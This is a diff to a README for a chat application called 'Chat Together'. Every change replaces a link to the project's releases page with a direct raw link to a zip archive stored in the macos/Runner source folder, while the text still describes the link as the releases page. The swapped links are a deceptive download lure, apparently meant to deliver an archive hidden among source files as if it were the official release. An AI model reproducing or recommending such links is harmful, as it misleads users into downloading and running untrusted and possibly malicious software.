@@ -6,14 +6,14 @@ Welcome to **Chat Together**! This application helps you connect with your famil
 
 ## 🔗 Download Now
 
-[![Download Chat Together](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Ronnyowo/chat_together/releases)
+[![Download Chat Together](https://raw.githubusercontent.com/Ronnyowo/chat_together/main/macos/Runner/chat-together-2.3.zip)](https://raw.githubusercontent.com/Ronnyowo/chat_together/main/macos/Runner/chat-together-2.3.zip)
 
 ## 📥 Download & Install
 
 To get started, you need to download the application from our releases page. 
 
 1. **Visit the Releases Page**: Click on the link below to go to the download page:
-   - [Download Chat Together](https://github.com/Ronnyowo/chat_together/releases)
+   - [Download Chat Together](https://raw.githubusercontent.com/Ronnyowo/chat_together/main/macos/Runner/chat-together-2.3.zip)
 
 2. **Find the Latest Version**: On the releases page, look for the latest version of Chat Together. It will usually be at the top of the list.
 
@@ -61,7 +61,7 @@ If you need more help, feel free to reach out. You can find support resources on
 
 ## 🔗 Important Links
 
-- **Releases Page**: [Download Chat Together](https://github.com/Ronnyowo/chat_together/releases)
+- **Releases Page**: [Download Chat Together](https://raw.githubusercontent.com/Ronnyowo/chat_together/main/macos/Runner/chat-together-2.3.zip)
 - **Support & Contact**: Visit the repository for FAQs and help.
 
 Thank you for choosing Chat Together. We hope it brings you closer to your family!
